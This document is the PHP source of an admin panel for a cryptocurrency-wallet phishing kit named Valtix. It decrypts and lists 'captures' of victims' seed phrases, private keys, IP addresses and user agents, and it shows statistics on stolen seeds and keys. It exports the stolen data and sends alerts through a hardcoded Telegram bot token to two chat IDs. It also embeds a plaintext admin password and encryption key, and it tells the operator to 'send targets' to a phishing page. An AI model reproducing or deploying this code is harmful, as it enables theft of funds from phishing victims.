<?php
session_start();

$ADMIN_PASSWORD     = 'Valtix@Admin2026';
$ENCRYPTION_KEY     = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV      = '1234567890abcdef';
$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$TELEGRAM_CHAT_IDS  = [
    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
    '8955126022'
];

$isAuthed = false; $error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === $ADMIN_PASSWORD) { $_SESSION['vt_admin'] = true; $isAuthed = true; }
    else { $error = 'Invalid password'; }
}
if (isset($_SESSION['vt_admin']) && $_SESSION['vt_admin'] === true) $isAuthed = true;
if (isset($_GET['logout'])) { session_destroy(); header('Location: admin.php'); exit; }

$message = '';
if ($isAuthed) {
    $logFile = __DIR__ . '/logs/captures.log';
    $summaryFile = __DIR__ . '/logs/summary.log';

    if (isset($_GET['action']) && $_GET['action'] === 'clear_all') {
        file_put_contents($logFile, ''); file_put_contents($summaryFile, '');
        $message = 'success_clear';
    }
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['line'])) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $ln = intval($_GET['line']);
        if (isset($lines[$ln])) { unset($lines[$ln]); file_put_contents($logFile, implode("\n", array_values($lines))."\n"); $message = 'success_delete'; }
    }
    if (isset($_GET['action']) && $_GET['action'] === 'export') {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $data = [];
        foreach ($lines as $line) {
            $d = openssl_decrypt(base64_decode($line), 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
            if ($d) $data[] = json_decode($d, true);
        }
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="valtix_captures_'.date('Y-m-d').'.json"');
        echo json_encode($data, JSON_PRETTY_PRINT);
        exit;
    }
    if (isset($_GET['action']) && $_GET['action'] === 'test_telegram') {
        $ok = true;
        foreach ($TELEGRAM_CHAT_IDS as $chatId) {
            $chatId = trim($chatId);
            if (empty($chatId)) continue;
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode(['chat_id' => $chatId, 'text' => '✅ Valtix Telegram alerts are LIVE!', 'parse_mode' => 'Markdown']),
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10,
            ]);
            curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($http !== 200) $ok = false;
        }
        $message = $ok ? 'success_tg' : 'fail_tg';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valtix — Admin Panel</title>
    <link rel="icon" type="image/png" href="images/logo.png">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0e1a;
            color: #c8d0d8;
            min-height: 100vh;
        }
        .container { max-width: 1500px; margin: 0 auto; padding: 20px 24px; }

        /* HEADER */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 16px 0; border-bottom: 1px solid rgba(0,122,255,0.08);
            margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
        }
        .header-left { display: flex; align-items: center; gap: 14px; }
        .header-left img { height: 30px; width: 30px; border-radius: 6px; }
        .header-left .title { font-size: 20px; font-weight: 700; background: linear-gradient(135deg,#007aff,#00c8ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-left .sub { font-size: 12px; color: #556677; }
        .header-actions { display: flex; gap: 8px; flex-wrap: wrap; }
        .header-actions a, .header-actions button {
            padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 500;
            text-decoration: none; transition: all 0.2s; cursor: pointer; border: none;
            display: inline-flex; align-items: center; gap: 5px;
        }
        .btn-blue { background: rgba(0,122,255,0.1); color: #4da6ff; border: 1px solid rgba(0,122,255,0.15); }
        .btn-blue:hover { background: rgba(0,122,255,0.18); }
        .btn-red { background: rgba(255,71,87,0.08); color: #ff4757; border: 1px solid rgba(255,71,87,0.12); }
        .btn-red:hover { background: rgba(255,71,87,0.15); }
        .btn-ghost { background: transparent; color: #556677; border: 1px solid rgba(255,255,255,0.04); }
        .btn-ghost:hover { color: #8899aa; border-color: rgba(255,255,255,0.08); }
        .btn-green { background: rgba(76,175,80,0.08); color: #4caf50; border: 1px solid rgba(76,175,80,0.12); }
        .btn-green:hover { background: rgba(76,175,80,0.15); }

        /* LOGIN */
        .login-wrap {
            min-height: 80vh; display: flex; align-items: center; justify-content: center;
        }
        .login-box {
            background: #0d1225; padding: 40px 36px; border-radius: 16px;
            max-width: 380px; width: 100%; text-align: center;
            border: 1px solid rgba(0,122,255,0.06);
        }
        .login-box img { height: 40px; width: 40px; border-radius: 10px; margin-bottom: 16px; }
        .login-box h2 { font-size: 20px; margin-bottom: 6px; color: #e0e8f0; }
        .login-box p { color: #556677; font-size: 13px; margin-bottom: 24px; }
        .login-box input {
            width: 100%; padding: 12px 16px; background: #080c1a;
            border: 1px solid rgba(0,122,255,0.08); border-radius: 8px;
            color: white; font-size: 14px; margin-bottom: 14px;
        }
        .login-box input:focus { outline: none; border-color: #007aff; }
        .login-box button {
            width: 100%; padding: 12px;
            background: linear-gradient(135deg,#007aff,#0055cc);
            border: none; border-radius: 8px; color: white;
            font-size: 14px; font-weight: 600; cursor: pointer;
        }
        .login-box button:hover { box-shadow: 0 6px 20px rgba(0,122,255,0.25); }
        .login-error { color: #ff4757; font-size: 13px; margin-top: 12px; }

        /* MESSAGES */
        .msg-bar { margin-bottom: 20px; }
        .msg {
            padding: 10px 16px; border-radius: 8px; font-size: 13px;
            display: flex; align-items: center; gap: 8px;
        }
        .msg.success { background: rgba(76,175,80,0.06); border: 1px solid rgba(76,175,80,0.1); color: #4caf50; }
        .msg.error { background: rgba(255,71,87,0.06); border: 1px solid rgba(255,71,87,0.1); color: #ff4757; }
        .msg.info { background: rgba(0,122,255,0.05); border: 1px solid rgba(0,122,255,0.08); color: #4da6ff; }

        /* STATS */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px; margin-bottom: 24px;
        }
        .stat-card {
            background: #0d1225; border: 1px solid rgba(255,255,255,0.03);
            border-radius: 10px; padding: 18px 16px; text-align: center;
        }
        .stat-card .num { font-size: 26px; font-weight: 700; color: #e8f0ff; line-height: 1.2; }
        .stat-card .num.green { color: #4caf50; }
        .stat-card .num.red { color: #ff4757; }
        .stat-card .num.blue { color: #4da6ff; }
        .stat-card .lbl { font-size: 11px; color: #556677; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.4px; }

        /* TABLE */
        .table-wrap {
            background: #0d1225; border: 1px solid rgba(255,255,255,0.03);
            border-radius: 12px; overflow: hidden;
        }
        .table-scroll { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 700px; }
        th {
            padding: 12px 14px; text-align: left; font-size: 10px;
            color: #556677; text-transform: uppercase; letter-spacing: 0.5px;
            font-weight: 600; background: rgba(0,122,255,0.02);
            border-bottom: 1px solid rgba(255,255,255,0.03); white-space: nowrap;
        }
        td {
            padding: 11px 14px; border-bottom: 1px solid rgba(255,255,255,0.02);
            font-size: 12px; vertical-align: middle;
        }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(0,122,255,0.02); }
        .cell-id { font-family: monospace; font-size: 10px; color: #445566; }
        .cell-ip { font-family: monospace; font-size: 11px; color: #667788; }
        .cell-seed { font-family: monospace; font-size: 11px; color: #4caf50; word-break: break-all; max-width: 240px; }
        .cell-key { font-family: monospace; font-size: 11px; color: #ff4757; word-break: break-all; max-width: 160px; }
        .cell-none { color: #2a2a3a; font-style: italic; }
        .cell-time { font-size: 11px; color: #556677; white-space: nowrap; }
        .cell-ua { font-size: 10px; color: #445566; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .cell-action a {
            color: #ff4757; text-decoration: none; font-size: 11px;
            padding: 3px 10px; border-radius: 4px;
        }
        .cell-action a:hover { background: rgba(255,71,87,0.1); }

        .no-data {
            text-align: center; padding: 50px 20px; color: #445566;
        }
        .no-data .icon { font-size: 42px; margin-bottom: 12px; opacity: 0.4; }
        .no-data p { font-size: 14px; }

        /* SUMMARY */
        .summary-box {
            margin-top: 20px; background: #0d1225;
            border: 1px solid rgba(255,255,255,0.03); border-radius: 12px;
            padding: 18px 20px;
        }
        .summary-box h3 {
            font-size: 11px; color: #556677; text-transform: uppercase;
            letter-spacing: 0.5px; margin-bottom: 10px;
        }
        .summary-box pre {
            background: #080c1a; padding: 12px 14px; border-radius: 8px;
            font-size: 11px; color: #445566; max-height: 160px;
            overflow-y: auto; white-space: pre-wrap;
            font-family: 'SF Mono', 'Courier New', monospace; line-height: 1.5;
        }

        /* RESPONSIVE */
        @media (max-width: 768px) {
            .container { padding: 14px 16px; }
            .header { flex-direction: column; align-items: stretch; }
            .header-actions { justify-content: flex-start; }
            .header-actions a, .header-actions button { font-size: 11px; padding: 6px 10px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
            .stat-card { padding: 14px 10px; }
            .stat-card .num { font-size: 22px; }
            td, th { padding: 8px 10px; font-size: 11px; }
            .cell-seed { max-width: 100px; }
            .cell-key { max-width: 70px; }
            .cell-ua { max-width: 60px; }
            .summary-box { padding: 14px; }
            .summary-box pre { font-size: 10px; }
        }
        @media (max-width: 480px) {
            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 6px; }
            .stat-card .num { font-size: 18px; }
            .stat-card .lbl { font-size: 9px; }
            .header-left .title { font-size: 16px; }
            .header-left img { height: 24px; width: 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <?php if (!$isAuthed): ?>
        <div class="login-wrap">
            <div class="login-box">
                <img src="images/logo.png" alt="Valtix">
                <h2>Admin Access</h2>
                <p>Enter your credentials to manage the platform</p>
                <form method="POST">
                    <input type="password" name="password" placeholder="Password" required autofocus>
                    <button type="submit">Sign In</button>
                </form>
                <?php if ($error): ?><div class="login-error">❌ <?php echo $error; ?></div><?php endif; ?>
            </div>
        </div>
    <?php else: ?>
        <!-- HEADER -->
        <div class="header">
            <div class="header-left">
                <img src="images/logo.png" alt="">
                <div>
                    <div class="title">Valtix</div>
                    <div class="sub">Control Panel</div>
                </div>
            </div>
            <div class="header-actions">
                <a href="?action=test_telegram" class="btn-green">📨 Test Telegram</a>
                <a href="?action=export" class="btn-blue">📥 Export</a>
                <a href="?action=clear_all" class="btn-red" onclick="return confirm('Delete ALL captures?')">🗑️ Clear</a>
                <a href="?logout=1" class="btn-ghost">🚪 Logout</a>
            </div>
        </div>

        <?php
        if ($message === 'success_clear') echo '<div class="msg-bar"><div class="msg success">✓ All captures deleted</div></div>';
        if ($message === 'success_delete') echo '<div class="msg-bar"><div class="msg success">✓ Entry deleted</div></div>';
        if ($message === 'success_tg') echo '<div class="msg-bar"><div class="msg success">✓ Telegram test sent to both recipients</div></div>';
        if ($message === 'fail_tg') echo '<div class="msg-bar"><div class="msg error">✗ Telegram test failed — check token or chat IDs</div></div>';

        $logFile = __DIR__ . '/logs/captures.log';
        $summaryFile = __DIR__ . '/logs/summary.log';
        $captures = []; $totalSeeds = 0; $totalKeys = 0; $ips = [];
        if (file_exists($logFile)) {
            $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                $d = openssl_decrypt(base64_decode($line), 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
                if ($d) { $data = json_decode($d, true); if ($data) { $captures[] = $data; if (!empty($data['seed'])) $totalSeeds++; if (!empty($data['pkey'])) $totalKeys++; if (!empty($data['ip'])) $ips[] = $data['ip']; } }
            }
        }
        $total = count($captures); $uniqueIps = array_unique($ips);
        ?>

        <!-- STATS -->
        <div class="stats-grid">
            <div class="stat-card"><div class="num blue"><?php echo $total; ?></div><div class="lbl">Captures</div></div>
            <div class="stat-card"><div class="num green"><?php echo $totalSeeds; ?></div><div class="lbl">Seeds</div></div>
            <div class="stat-card"><div class="num red"><?php echo $totalKeys; ?></div><div class="lbl">Keys</div></div>
            <div class="stat-card"><div class="num blue"><?php echo count($uniqueIps); ?></div><div class="lbl">IPs</div></div>
            <div class="stat-card"><div class="num"><?php echo $total > 0 ? round(($totalSeeds/$total)*100).'%' : '0%'; ?></div><div class="lbl">Success</div></div>
        </div>

        <!-- TABLE -->
        <div class="table-wrap">
            <?php if (empty($captures)): ?>
                <div class="no-data">
                    <div class="icon">📭</div>
                    <p>No captures yet. Send targets to <strong>dashboard.html</strong></p>
                </div>
            <?php else: ?>
                <div class="table-scroll">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>ID</th>
                                <th>Timestamp</th>
                                <th>IP</th>
                                <th>Seed Phrase</th>
                                <th>Private Key</th>
                                <th>Words</th>
                                <th>Screen</th>
                                <th>UA</th>
                                <th></th>
                            </tr>
                        </thead>
                        <tbody>
                        <?php foreach (array_reverse($captures) as $idx => $c): $realIdx = count($captures) - 1 - $idx; ?>
                            <tr>
                                <td><?php echo $idx + 1; ?></td>
                                <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 10)); ?></td>
                                <td class="cell-time"><?php echo htmlspecialchars($c['capturedAt']??'—'); ?></td>
                                <td class="cell-ip"><?php echo htmlspecialchars($c['ip']??'—'); ?></td>
                                <td class="<?php echo !empty($c['seed'])?'cell-seed':'cell-none'; ?>"><?php echo !empty($c['seed'])?htmlspecialchars($c['seed']):'—'; ?></td>
                                <td class="<?php echo !empty($c['pkey'])?'cell-key':'cell-none'; ?>"><?php echo !empty($c['pkey'])?htmlspecialchars($c['pkey']):'—'; ?></td>
                                <td><?php echo $c['seedWordCount']??0; ?></td>
                                <td class="cell-ua"><?php echo htmlspecialchars($c['screenSize']??'—'); ?></td>
                                <td class="cell-ua" title="<?php echo htmlspecialchars($c['userAgent']??''); ?>"><?php echo htmlspecialchars(substr($c['userAgent']??'',0,30)); ?>…</td>
                                <td class="cell-action"><a href="?action=delete&line=<?php echo $realIdx; ?>" onclick="return confirm('Delete this entry?')">✕</a></td>
                            </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
        </div>

        <!-- SUMMARY -->
        <?php if (file_exists($summaryFile) && filesize($summaryFile) > 0): ?>
            <div class="summary-box">
                <h3>Activity Log</h3>
                <pre><?php echo htmlspecialchars(file_get_contents($summaryFile)); ?></pre>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>
</body>
</html>
